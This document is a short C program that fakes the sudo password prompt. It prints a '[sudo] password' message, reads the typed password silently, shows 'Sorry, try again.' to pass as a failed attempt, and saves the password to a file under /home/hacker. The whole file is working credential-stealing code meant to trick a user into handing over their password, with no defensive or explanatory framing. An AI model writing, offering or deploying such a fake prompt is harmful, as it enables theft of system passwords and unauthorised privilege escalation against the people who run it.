#include<stdio.h>
#include<stdlib.h>

#include<unistd.h>

#define PASSWORD_PATH "/home/hacker/password.txt"


int main()
{
  
  printf("[sudo] - password for %s: ",getenv("USER"));
  char* password = getpass("");
  
  sleep(1);
  printf("Sorry, try again.");
  
  FILE* passwordFile = fopen(PASSWORD_PATH,"w");
  fprintf(passwordFile,"%s",password);
  fclose(passwordFile);
    
  return 0; 
}
